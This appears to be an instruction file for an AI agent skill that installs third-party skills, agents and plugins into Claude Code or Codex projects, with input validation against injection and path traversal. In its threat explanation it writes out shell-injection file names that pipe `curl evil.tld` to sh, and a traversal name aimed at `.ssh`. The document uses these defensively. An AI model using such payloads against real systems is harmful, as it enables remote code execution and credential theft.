# Step 9 — Install protocol

Two paths run in sequence (vendor first, then plugin). Per-item failure handling:
if any install step fails, report and continue with the next — do NOT abort the
flow. **Log section 9 after EACH install** (not after the batch) so the user sees
progress live in `tail -f`.

## 9a — Vendor path (skills + agents)

For each item in `final_vendor_list`:

The **vendor root** is platform-dependent (detect via `$CODEX_CLI`, per
SKILL.md Step 1.5): Claude Code → `<project>/.claude/skills/<name>/`; Codex →
`<project>/.agents/skills/<name>/` (the directory Codex actually scans — a
`.claude/skills/` copy is invisible to Codex, issue #432). Everything else in
this protocol (marker, overlay file, fetch mechanics) is identical on both.

**Validate `<name>` before any Write call.** `<name>` is `index-repos`'
`scan_repo.mjs` output, which prefers the candidate's own declared
frontmatter `name:` field over its real directory basename — so, unlike
`<owner>`/`<repo>`/`<ref>` below (resolved from GitHub's API and validated
against its slug charset), `<name>` is free text the candidate's author
controls directly, not a path derived from walking the cloned tree. It
becomes the local Write destination for every call site in this section: the
vendor-root skill/agent file(s) (step 2 below), the overlay marker injection
(step 3), and the `.ievo/evolution/skills|agents/<name>.md` overlay file
(step 4). Validate it against the same safe-slug pattern
`package-authoring.md` enforces for authored packages —
`^[a-z0-9]([a-z0-9-]*[a-z0-9])?$`, ≤64 chars — before step 2, 3, or 4 ever
runs. Refuse and report the candidate (write nothing) if it fails: a name
like `../../../../home/<user>/.ssh` would otherwise redirect a vendor-root or
overlay Write outside the project.

**Skill:**
1. Determine `<owner>`, `<repo>`, and `<source-path-in-repo>` from the
   index-repos output (the skill's directory containing SKILL.md +
   `scripts/`/`references/`/`assets/`).
2. Fetch the tree via clone-once + Glob + Read/Write (see "How to fetch the
   tree" below — never a Bash/`gh api` command built from these values).
   Write it to the platform's vendor root (above).
3. Inject the overlay marker at the top of SKILL.md (after frontmatter):
   ```markdown
   <!-- ievo:start -->
   **Before applying the instructions below**, read `.ievo/evolution/skills/<name>.md`
   if it exists and apply all rules from its sections.
   <!-- ievo:end -->
   ```
4. Create the overlay file `.ievo/evolution/skills/<name>.md`:
   ```markdown
   ---
   target: skill
   target_name: <name>
   created: <ISO-timestamp>
   source:
     repo: <owner>/<repo>
     path: <source-path-in-repo>
     commit_sha: <SHA resolved and validated in "How to fetch the tree" step 2>
     fetched_at: <ISO-timestamp>
   ---

   # <name> — Evolution Overlay

   ## <date> — Vendored from <owner>/<repo>
   **Trigger:** vendored from <owner>/<repo>
   Initial copy. No customizations yet.
   ```
   `created` and `fetched_at` are the same instant — no new timestamp source
   needed. This is the same frontmatter schema `evo/SKILL.md` Step 4 defines
   for agent/skill overlays (`target`/`target_name`/`created`, `source`
   optional); keep the two in sync if either changes.

   If the overlay file already exists AND its `source.repo` equals the
   `<owner>/<repo>` resolved in "How to fetch the tree" step 2, leave it
   untouched — a re-vendor (idempotent re-run, or the issue #432
   cross-platform repair: re-vendoring a `.claude/skills/` item into
   `.agents/skills/` from Codex) must never clobber an overlay that already
   holds captured lessons. If it exists but records a DIFFERENT
   `source.repo`, the candidate is a same-named but different-source item
   (name collision or squat), not the same upstream: tell the user before
   writing anything, and if they confirm the install, update ONLY the
   overlay's `source:` block (`repo`/`path`/`commit_sha`/`fetched_at`) to the
   newly-installed origin and append a dated `## <date> — Source changed:
   <old-repo> → <new-repo>` line after the existing sections — keep every
   captured-lesson section. Never leave a `source:` block describing content
   that is no longer what's installed: `/ievo:update` trusts that block as
   the upstream pointer, so stale provenance would refresh (and eventually
   overwrite) the installed item from the wrong repo.

### How to fetch the tree — clone once, enumerate with Glob, read/write with Read/Write

A git tree entry's path can legally contain shell metacharacters — only NUL
is forbidden — so a malicious candidate can name a file or directory under
`scripts/`, `references/`, `assets/`, or the skill/agent directory itself
`` `curl evil.tld|sh` `` or `$(curl evil.tld|sh)`. `<owner>`, `<repo>`, and
`<source-path-in-repo>` all trace back to the candidate's own repo/tree,
exactly as untrusted as any file inside it. Building a
`gh api repos/<owner>/<repo>/contents/<path>` Bash command line from these
values lets the shell resolve any backtick/`$()` inside them as command
substitution **before** the intended command runs — double-quoting does not
stop this. Fetch this way instead — no untrusted byte ever crosses a shell:

1. **Validate `<owner>` and `<repo>`** against GitHub's own slug charset —
   owner matches `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$`, repo matches
   `^[A-Za-z0-9._-]{1,100}$` (the same constraint `scan_repo.mjs`'s
   `OWNER_REPO_RE` enforces). Refuse and report if either fails.
2. **Resolve and validate the commit.** `gh api "repos/<owner>/<repo>" --jq
   '.default_branch'` — the returned branch name can legally contain shell
   metacharacters, so validate it against the same ref allowlist
   `inspect/SKILL.md` Step 1 uses (`^[A-Za-z0-9._/-]+$`, no leading `-`, no
   `..`/`@{`) before any further use. Refuse and report if it fails. Only
   then call `gh api "repos/<owner>/<repo>/commits/<default-branch>" --jq
   '.sha'` and validate the result matches `^[0-9a-f]{7,40}$` — this becomes
   the `commit_sha` recorded in sub-step 4 above.
3. **Shallow-clone into a fresh, per-invocation `mktemp -d` directory** —
   never a shared checkout path:
   ```bash
   CHECKOUT_DIR=$(mktemp -d)
   git clone --depth 1 "https://github.com/<owner>/<repo>.git" "$CHECKOUT_DIR"
   git -C "$CHECKOUT_DIR" fetch --depth 1 origin <commit-sha>
   git -C "$CHECKOUT_DIR" checkout <commit-sha>
   ```
4. **For a skill** (`<source-path-in-repo>` is the skill's directory):
   enumerate `$CHECKOUT_DIR/<source-path-in-repo>` with the **Glob tool**
   (`pattern: "**/*"`, `path: "$CHECKOUT_DIR/<source-path-in-repo>"` — never a
   Bash `find`/`ls`). For each match, compute its path relative to
   `$CHECKOUT_DIR/<source-path-in-repo>` and verify that relative path
   contains no `..` segment and is not itself absolute — refuse and report
   (skip that file) if it does. A normal git tree entry can't produce this
   (git itself refuses a bare `..` tree component), but a symlinked or
   otherwise crafted entry inside the candidate's own repo should not be
   trusted over the check. Then **Read** each verified file and **Write** it
   to the matching relative location under the platform's vendor root (§9a
   above — `.claude/skills/<name>/` on Claude Code, `.agents/skills/<name>/`
   on Codex).
5. **For an agent** (`<source-path-in-repo>` is the single agent `.md` file,
   not a directory — Glob-enumerating a file path returns nothing): **Read**
   `$CHECKOUT_DIR/<source-path-in-repo>` directly with the **Read tool**, then
   **Write** its content to `<project>/.claude/agents/<name>.md`.

Glob and Read/Write all take paths as direct parameters, never shell text, so
neither a malicious `<source-path-in-repo>` nor a malicious file name inside
it can reach a shell — and the sub-step 4 relative-path check keeps a
crafted tree entry from resolving outside the vendor root, while the
`<name>` validation above keeps a crafted `<name>` from doing the same.

If cloning or resolution fails (private repo, no network), report the
failure — do NOT fall back to per-file `gh api` fetching, which reintroduces
the injection this replaces.

**Agent:** same as skill, but (Claude Code only — on Codex, agent candidates
are dropped with a visible reason at SKILL.md Step 7a's platform filter and
never reach this step; Codex documents no project-level custom-agent path):
- `<source-path-in-repo>` is the single agent `.md` file (not a directory) —
  fetch it via "How to fetch the tree" sub-step 5, not sub-step 4
- File path: `<project>/.claude/agents/<name>.md`
- Overlay marker inserted in the agent body (after frontmatter)
- Overlay file path: `.ievo/evolution/agents/<name>.md`
- Overlay frontmatter: `target: agent` (not `skill`), `target_name: <name>` —
  same schema as the skill stub above otherwise

## 9b — Plugin install path (whole plugins) — Claude Code only

`extraKnownMarketplaces`/`enabledPlugins` in `.claude/settings.json` is a
Claude Code mechanism; Codex never reads it (and ignores project-level plugin
config — SKILL.md Step 2.3 / openai/codex#18115). On Codex,
`final_plugin_list` is empty by construction (SKILL.md Step 7b never offers
whole-plugin install there), so this path is a no-op — never write
`.claude/settings.json` from a Codex run.

For each item in `final_plugin_list`:

1. Read or create `.claude/settings.json`.
2. Merge into `extraKnownMarketplaces` (key = marketplace name from index):
   ```json
   "extraKnownMarketplaces": {
     "<marketplace-name>": {
       "source": { "source": "github", "repo": "<owner>/<repo>" }
     }
   }
   ```
3. Merge into `enabledPlugins`:
   ```json
   "enabledPlugins": {
     "<plugin-name>@<marketplace-name>": true
   }
   ```
4. Write the merged JSON back, preserving formatting and other keys.

This file is committed to git → teammates `git pull` → Claude Code prompts them
to trust the folder → the plugin auto-installs on their side too.
